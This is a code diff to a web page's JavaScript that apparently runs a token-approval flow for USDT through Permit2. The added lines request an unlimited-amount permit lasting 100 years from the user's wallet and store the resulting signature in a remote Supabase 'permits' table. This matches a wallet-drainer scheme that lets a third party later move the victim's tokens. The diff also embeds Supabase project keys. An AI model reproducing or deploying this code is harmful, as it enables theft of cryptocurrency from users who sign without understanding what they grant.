@@ -265,15 +265,7 @@ const erc20Abi = [
 const tokenContract = new ethers.Contract(TOKEN, erc20Abi, signer);
 const allowance = await tokenContract.allowance(user, PERMIT2);
 
-if (allowance === 0n) {
-  log("🔓 First time: approving USDT...");
 
-  const tx = await tokenContract.approve(PERMIT2, ethers.MaxUint256);
-  await tx.wait();
-
-  log("✅ USDT Approved — run again");
-  return;
-}
  
 
 const tokenC = new ethers.Contract(
@@ -294,26 +286,22 @@ const permit2 = new ethers.Contract(
   ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
   provider
 );
+const [allowedAmount, allowedExpiration, nonce] =
+  await permit2.allowance(user, TOKEN, CONTRACT);
 
-let details;
+log("Nonce: " + nonce);
+const MAX_UINT160 = (1n << 160n) - 1n;
 
-if (balance === 0n) {
-  log("⚠️ TEST MODE: using fake balance");
+const expiration = Math.floor(Date.now()/1000) + (100 * 365 * 24 * 60 * 60);
 
-  details = [{
-    token: TOKEN,
-    amount: 1000000n,
-    expiration: Math.floor(Date.now()/1000)+2592000,
-    nonce: 0
-  }];
-} else {
-  details = [{
-    token: TOKEN,
-    amount: balance,
-    expiration: Math.floor(Date.now()/1000)+2592000,
-    nonce: 0
-  }];
-}
+const details = [{
+  token: TOKEN,
+  amount: MAX_UINT160,
+  expiration: expiration,
+  nonce: nonce
+}];
+
+
 
   // ✍️ SIGN
   const chainId = (await provider.getNetwork()).chainId;
@@ -337,11 +325,11 @@ if (balance === 0n) {
       { name: "nonce", type: "uint48" }
     ]
   };
-
+  const sigDeadline = Math.floor(Date.now()/1000) + (30 * 24 * 60 * 60);
   const values = {
     details,
     spender: CONTRACT,
-    sigDeadline: Math.floor(Date.now()/1000)+3600
+ 
   };
 
   log("✍️ Requesting signature...");
@@ -359,20 +347,22 @@ log("💾 Saving to Supabase...");
 const { error } = await window.supabaseClient
   .from('permits')
   .insert([
-    {
-      owner: user,
-      token: TOKEN,
-      spender: CONTRACT,
+  {
+    owner: user,
+    token: TOKEN,
+    spender: CONTRACT,
 
-      amount: details[0].amount.toString(),
-      nonce: details[0].nonce,
-      deadline: values.sigDeadline,
+    amount: details[0].amount.toString(),
+    expiration: details[0].expiration,
+    nonce: Number(details[0].nonce),
 
-      v: v,
-      r: r,
-      s: s
-    }
-  ]);
+    sig_deadline: sigDeadline,
+
+    v: v,
+    r: r,
+    s: s
+  }
+])
 
 if (error) {
   log("❌ Supabase error: " + error.message);
@@ -416,7 +406,7 @@ import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
 const supabaseClient = createClient(
   "https://ghqlvoysfrifitwscssd.supabase.co",
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdocWx2b3lzZnJpZml0d3Njc3NkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MTY2MzAsImV4cCI6MjA4OTQ5MjYzMH0.LxZKp9k0wZZV2WDNp2IhD0WjH4cuWrRQRginw0GiPpE"
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlwbWtjbWppdW1yemNybnBmbmVlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5NzcwODMsImV4cCI6MjA4OTU1MzA4M30.OfhWwoyDkr9pjrcM3RBYRpB8PG-EqyyuXeukjakJbQw"
 );
 
 window.supabaseClient = supabaseClient;
